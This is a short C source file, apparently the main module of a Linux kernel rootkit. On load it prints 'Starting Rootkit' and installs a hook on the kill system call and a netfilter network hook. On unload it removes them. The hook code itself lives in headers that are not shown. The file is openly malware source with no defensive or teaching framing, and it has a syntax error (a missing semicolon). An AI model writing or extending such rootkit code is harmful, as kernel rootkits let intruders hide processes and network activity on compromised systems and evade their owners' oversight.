#include <linux/kernel.h>
#include <linux/module.h>
#include <hook_net.h> 
#include <hook_kill.h>



int init_module() {
  printk(KERN_INFO "Starting Rootkit\n");  
  init_kill_hook();
  register_net_hook();
  return 0;
}


void cleanup_module() {
  nf_unregister_net_hook(&init_net, &nfhook);
  remove_hook_kill()
  printk(KERN_INFO "Stoping Rootkit\n");
}
